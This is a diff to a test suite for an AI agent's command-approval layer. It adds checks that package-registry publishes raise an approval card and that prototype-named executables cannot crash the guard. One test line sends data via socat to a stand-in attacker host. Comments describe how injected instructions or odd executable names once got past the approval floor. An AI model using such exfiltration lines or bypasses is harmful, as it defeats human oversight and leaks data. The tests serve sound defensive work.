@@ -13,6 +13,7 @@ import {
   effectiveCommands,
   gitConfigRunsCode,
   gitConfigWrite,
+  registryPublishOperation,
   sendsDataOverNetwork,
   shellWriteTargets,
   untrustedShellOrigin
@@ -1115,5 +1116,140 @@ describe('the far ends a command writes down without writing a URL', () => {
       expect(shell({ executable: 'socat', args: ['-', `${type}:attacker.example:443`] })).toEqual([
         'https://attacker.example/'
       ]);
+  });
+});
+
+describe('the operation a package manager is being asked to perform', () => {
+  /*
+   * The check `safeNetworkExecutables` never had. That set is an allowlist of EXECUTABLES, so the
+   * allowance written for `npm install` carried `npm publish` - and `curl` and `git` had operation
+   * checks bolted on (`sendsDataOverNetwork`, `gitSubcommand`) while the package managers did not.
+   * Measured before this existed: every publish below raised no card in balanced or in autonomous.
+   */
+  it('names the publish, so the card can print which one it is', () => {
+    expect(registryPublishOperation('npm', ['publish'])).toBe('npm publish');
+    expect(registryPublishOperation('cargo', ['publish', '--dry-run'])).toBe('cargo publish');
+    expect(registryPublishOperation('yarn', ['npm', 'publish'])).toBe('yarn npm publish');
+    expect(registryPublishOperation('dotnet', ['nuget', 'push', 'x.nupkg'])).toBe(
+      'dotnet nuget push'
+    );
+    expect(registryPublishOperation('twine', ['upload', 'dist/x.whl'])).toBe('twine upload');
+  });
+
+  /*
+   * The operation is matched as a RUN rather than at a fixed position, because `mvn clean deploy`
+   * and `mvn -DskipTests clean deploy` are the ordinary spellings and neither puts it first.
+   */
+  it('finds the operation wherever the invocation puts it', () => {
+    for (const args of [
+      ['deploy'],
+      ['clean', 'deploy'],
+      ['-DskipTests', 'clean', 'deploy'],
+      ['--batch-mode', 'clean', 'verify', 'deploy']
+    ])
+      expect(registryPublishOperation('mvn', args), args.join(' ')).toBe('mvn deploy');
+    expect(registryPublishOperation('npm', ['--workspace=api', 'publish'])).toBe('npm publish');
+  });
+
+  /* `docker buildx build --push .` is the spelling in every CI file and never says the word. */
+  it('reads the one spelling that is an option rather than an operation', () => {
+    expect(registryPublishOperation('docker', ['buildx', 'build', '--push', '.'])).toBe(
+      'docker --push'
+    );
+    expect(registryPublishOperation('docker', ['buildx', 'build', '.'])).toBeNull();
+  });
+
+  /*
+   * Reading a registry is how anybody checks the state of a package before deciding anything about
+   * it, and a card in front of a read is the defect the READS table in the cards rig exists to
+   * catch. Four verbs, named because npm spells its reads as words.
+   */
+  it('says nothing about reading who owns a package or what the tags are', () => {
+    for (const args of [
+      ['owner', 'ls', 'p'],
+      ['owner', 'list', 'p'],
+      ['dist-tag', 'ls', 'p'],
+      ['access', 'list', 'packages'],
+      ['access', 'get', 'status']
+    ])
+      expect(registryPublishOperation('npm', args), args.join(' ')).toBeNull();
+    expect(registryPublishOperation('dotnet', ['nuget', 'list', 'source'])).toBeNull();
+  });
+
+  /*
+   * The direction that costs the owner. These executables are on `safeNetworkExecutables` because
+   * installing and building is what this computer does all day; a rule that answered about the
+   * executable rather than the operation would stop every turn this product has.
+   */
+  it('says nothing about installing, building, packing or versioning', () => {
+    const free: Array<[string, string[]]> = [
+      ['npm', ['install', 'express']],
+      ['npm', ['ci']],
+      ['npm', ['run', 'build']],
+      ['npm', ['run', 'publish-docs']],
+      ['npm', ['pack']],
+      ['npm', ['version', 'patch']],
+      ['npm', ['whoami']],
+      ['cargo', ['build']],
+      ['cargo', ['check']],
+      ['cargo', ['install', 'ripgrep']],
+      ['mvn', ['package']],
+      ['dotnet', ['build']],
+      ['gradlew', ['build']],
+      // Writes to `~/.m2` on this computer, where nobody else can install it.
+      ['gradlew', ['publishToMavenLocal']],
+      // An executable with no operation table at all.
+      ['git', ['commit', '-m', 'npm publish']],
+      ['echo', ['npm', 'publish']]
+    ];
+    for (const [executable, args] of free)
+      expect(
+        registryPublishOperation(executable, args),
+        `${executable} ${args.join(' ')}`
+      ).toBeNull();
+  });
+
+  /*
+   * `--dry-run` is deliberately not an exemption. It is one word away from the real thing, the card
+   * prints the whole command for a person to read, and an exemption keyed on a flag is an exemption
+   * an injected instruction writes for itself.
+   */
+  it('does not let a flag argue its way out', () => {
+    expect(registryPublishOperation('npm', ['publish', '--dry-run'])).toBe('npm publish');
+    expect(registryPublishOperation('cargo', ['publish', '--no-verify'])).toBe('cargo publish');
+  });
+});
+
+describe('a table keyed by something the model wrote', () => {
+  /*
+   * Six of the address readers here are indexed by an executable or a subcommand taken straight out
+   * of the tool call, and a plain object answers for every name on `Object.prototype`:
+   * `LOCAL_VALUE_OPTIONS['toString']` is a function rather than undefined, so `optionValueAt`'s
+   * `table.has(...)` threw. Driven on the shipped floor before the guard, this raised a TypeError
+   * out of `commandAddresses`, through `callDestinations`, through `ordinaryRequirement` - and
+   * nothing between the model and there catches it, so five characters in one argument turned the
+   * approval floor into an exception. A floor that throws is a floor that did not fire.
+   */
+  it('answers about a command named after a prototype member without throwing', () => {
+    for (const name of ['toString', 'constructor', 'hasOwnProperty', 'valueOf', '__proto__']) {
+      expect(() =>
+        callDestinations('shell', { executable: name, args: ['-o', 'x'] })
+      ).not.toThrow();
+      expect(callDestinations('shell', { executable: name, args: ['-o', 'x'] })).toEqual([]);
+      expect(registryPublishOperation(name, ['publish'])).toBeNull();
+    }
+  });
+
+  /* And the readers still read. A guard that answered undefined for everything would pass above. */
+  it('still reads the address out of the options those tables describe', () => {
+    expect(
+      callDestinations('shell', { executable: 'curl', args: ['-o', 'a', 'https://x.invalid/p'] })
+    ).toEqual(['https://x.invalid/p']);
+    expect(
+      callDestinations('shell', {
+        executable: 'aws',
+        args: ['s3', 'cp', 'notes.txt', 's3://bucket/key']
+      }).length
+    ).toBeGreaterThan(0);
   });
 });
